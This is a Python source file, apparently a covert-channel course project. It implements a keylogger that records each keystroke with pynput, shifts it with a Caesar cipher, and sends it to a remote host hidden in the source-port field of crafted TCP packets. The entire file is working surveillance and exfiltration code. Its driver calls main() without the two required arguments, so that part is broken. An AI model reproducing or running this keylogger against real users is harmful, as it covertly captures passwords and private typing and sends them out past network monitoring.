#!/usr/bin/env python

###########################################################################################
# FILE
#
#   Name:  sender.py
#
#   Developer:  Eunsaem Lee
#
#   Date:       2022-10-17
#
#   Description:
#     This file handles reading from the keyboard, encrypting data using Caesar Cipher, and
#     sending packets over a covert channel.
#
###########################################################################################

# Imports pynput module
from pynput.keyboard import Key, Listener
# Imports Scapy module
from scapy.all import *

import sys

HOST = None
KEY = None

###########################################################################################
# FUNCTIONS
#
#   Name:  on_press
#
#   Parameters:
#     key       - keyboard input
#
#   Returns:
#     None.
#
#   Description:
#     Listens for and reads keys pressed on the keyboard. Prints acknowledgement message.
#
###########################################################################################
def on_press(key):
    try:
        print("\nBefore encryption: " + format(key.char))
    except AttributeError:
        print("Before encryption: " + format(key))

###########################################################################################
# FUNCTIONS
#
#   Name:  on_release
#
#   Parameters:
#     key       - keyboard input
#
#   Returns:
#     None.
#
#   Description:
#     Listens for and reads keys released from the keyboard. Exits if ESC key is pressed.
#     Encrypts the keyboard input using Caesar Cipher, embeds the encrypted data into a
#     TCP packet and sends it. If not, prints an error message.
#
###########################################################################################
def on_release(key):
    try:
        if key == Key.esc:
            sys.exit(1)
        else:
            enc_data = encrypt(format(key.char), KEY)
            print("After encryption:  " + enc_data + "\n")
            pkts = create_packet(enc_data)

            for pkt in pkts:
                send(pkt)
    except AttributeError:
        print("Special key {0} pressed".format(key))

###########################################################################################
# FUNCTION
#
#   Name:  listener
#
#   Parameters:
#     None.
#
#   Returns:
#     None.
#
#   Description:
#     Listens for and reads user input from the keyboard, and sends encrypted data
#     embedded in the source port of TCP packet(s). If not, prints an error message.
#
###########################################################################################
def listener():
    try:
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except Exception as error:
        print(str(error))

###########################################################################################
# FUNCTION
#
#   Name:  encrypt
#
#   Parameters:
#     data      - keyboard input
#     KEY       - Key Value to encrypt data
#
#   Returns:
#     enc_data  - encrypted data
#
#   Description:
#     Creates a packet with a covert message embedded in the packet. If not, prints an
#     error message
#
###########################################################################################
def encrypt(data, KEY):
    try:
        enc_data = ""

        for i in range(len(data)):
            char = data[i]
            enc_data += chr((ord(char) + KEY) % 128)
        
        return enc_data
    except Exception as error:
        print(str(error))

###########################################################################################
# FUNCTION
#
#   Name:  create_packet
#
#   Parameters:
#     enc_data  - encrypted data that will be embedded into a packet
#
#   Returns:
#     pkt       - new TCP packet with an embedded character in its source port
#
#   Description:
#     Creates a TCP packet with a covert message embedded in the packet.
#
###########################################################################################
def create_packet(enc_data):
    for x in enc_data:
        char = ord(x)
        pkt = IP(dst=HOST) / TCP(sport=char, dport=RandNum(0, 65535), flags='E')
        yield pkt

###########################################################################################
# FUNCTION
#
#   Name:  init
#
#   Parameters:
#     HOST_IP   - Host IP address to send embedded packets
#     KEY_VALUE - Key Value to encrypt data
#
#   Returns:
#     None.
#
#   Description:
#     Initializes values of Host IP address and Key Value.
#
###########################################################################################
def init(HOST_IP, KEY_VALUE):
    global HOST
    HOST = HOST_IP

    global KEY
    KEY = KEY_VALUE

###########################################################################################
# FUNCTION (MAIN)
#
#   Name:  main
#
#   Parameters:
#     HOST_IP   - Host IP address to send embedded packets
#     KEY_VALUE - Key Value to encrypt data
#
#   Returns:
#     None.
#
#   Description:
#     Initializes values of Host IP address and Key Value for encryption using Caesar 
#     Cipher. Listens for and reads user input from the keyboard, and sends encrypted data
#     embedded in the source port of TCP packet(s). If not, prints an error message.
#
###########################################################################################
def main(HOST_IP, KEY_VALUE):
    try:
        init(HOST_IP, KEY_VALUE)
        listener()
    except Exception as error:
        print(str(error))
        sys.exit(1)

###########################################################################################
# FUNCTION (DRIVER)
#
#   Name:  menu
#
#   Parameters:
#     None.
#
#   Returns:
#     None.
#
#   Description:
#     Calls the main function.
#
###########################################################################################
if __name__ == "__main__":
    main()
